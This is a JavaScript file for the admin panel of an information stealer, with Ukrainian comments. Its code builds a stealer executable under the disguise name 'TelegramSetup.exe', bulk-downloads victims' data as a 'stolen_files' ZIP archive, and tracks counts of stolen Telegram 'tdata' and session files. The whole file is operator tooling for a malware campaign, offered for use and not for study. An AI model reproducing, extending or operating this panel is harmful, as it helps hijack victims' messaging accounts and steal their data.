// static/js/stealer.js
class StealerManager {
    constructor() {
        this.initEventListeners();
        this.checkBuildStatus();
    }

    initEventListeners() {
        // Обробка форми білдера
        const stealerForm = document.getElementById('stealerForm');
        if (stealerForm) {
            stealerForm.addEventListener('submit', (e) => {
                this.handleBuildForm(e);
            });
        }

        // Оновлення статистики кожні 30 секунд
        setInterval(() => {
            this.updateStats();
        }, 30000);
    }

    handleBuildForm(e) {
        e.preventDefault();
        const buildBtn = document.getElementById('buildBtn');
        const originalText = buildBtn.innerHTML;
        
        // Показуємо індикатор завантаження
        buildBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Будую...';
        buildBtn.disabled = true;

        // Відправляємо форму
        const formData = new FormData(e.target);
        
        fetch(e.target.action, {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (response.ok) {
                return response.blob();
            }
            throw new Error('Помилка побудови');
        })
        .then(blob => {
            // Створюємо посилання для завантаження
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            
            // Отримуємо ім'я файлу з форми
            const filename = formData.get('filename') || 'TelegramSetup';
            a.download = `${filename}.exe`;
            
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            
            this.showAlert('Стіллер успішно збудовано та завантажено!', 'success');
            this.updateStats();
        })
        .catch(error => {
            console.error('Error:', error);
            this.showAlert('Помилка при побудові стіллера: ' + error.message, 'danger');
        })
        .finally(() => {
            // Відновлюємо кнопку
            buildBtn.innerHTML = originalText;
            buildBtn.disabled = false;
        });
    }

    downloadAllFiles() {
        if (!confirm('Завантажити всі файли як ZIP архів?')) {
            return;
        }

        fetch('/admin/stealer/download_all')
        .then(response => {
            if (response.ok) {
                return response.blob();
            }
            throw new Error('Помилка завантаження');
        })
        .then(blob => {
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = `stolen_files_${new Date().toISOString().split('T')[0]}.zip`;
            
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            
            this.showAlert('Всі файли успішно завантажено!', 'success');
        })
        .catch(error => {
            console.error('Error:', error);
            this.showAlert('Помилка завантаження файлів: ' + error.message, 'danger');
        });
    }

    updateStats() {
        fetch('/admin/api/stats')
        .then(response => response.json())
        .then(stats => {
            // Оновлюємо бейджи з статистикою
            const fileCountBadge = document.querySelector('.badge.bg-info');
            const tdataBadge = document.querySelector('.badge.bg-success');
            const sessionsBadge = document.querySelector('.badge.bg-warning');
            
            if (fileCountBadge) fileCountBadge.textContent = `Файлів: ${stats.files || 0}`;
            if (tdataBadge) tdataBadge.textContent = `tdata: ${this.calculateTdataCount(stats)}`;
            if (sessionsBadge) sessionsBadge.textContent = `sessions: ${this.calculateSessionsCount(stats)}`;
        })
        .catch(error => {
            console.error('Error updating stats:', error);
        });
    }

    calculateTdataCount(stats) {
        // Тут буде логіка підрахунку tdata файлів
        return Math.floor((stats.files || 0) * 0.6); // Приклад
    }

    calculateSessionsCount(stats) {
        // Тут буде логіка підрахунку session файлів
        return Math.floor((stats.files || 0) * 0.4); // Приклад
    }

    checkBuildStatus() {
        // Перевіряємо чи є параметр успішної збірки в URL
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('built') === 'true') {
            this.showAlert('Стіллер успішно збудовано!', 'success');
            // Видаляємо параметр з URL
            window.history.replaceState({}, document.title, window.location.pathname);
        }
    }

    showAlert(message, type) {
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
        alertDiv.innerHTML = `
            ${message}
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        `;
        document.querySelector('.main-content').prepend(alertDiv);
        
        // Автоматично видаляємо сповіщення через 5 секунд
        setTimeout(() => {
            if (alertDiv.parentNode) {
                alertDiv.remove();
            }
        }, 5000);
    }
}

// Ініціалізація при завантаженні сторінки
document.addEventListener('DOMContentLoaded', function() {
    window.stealerManager = new StealerManager();
});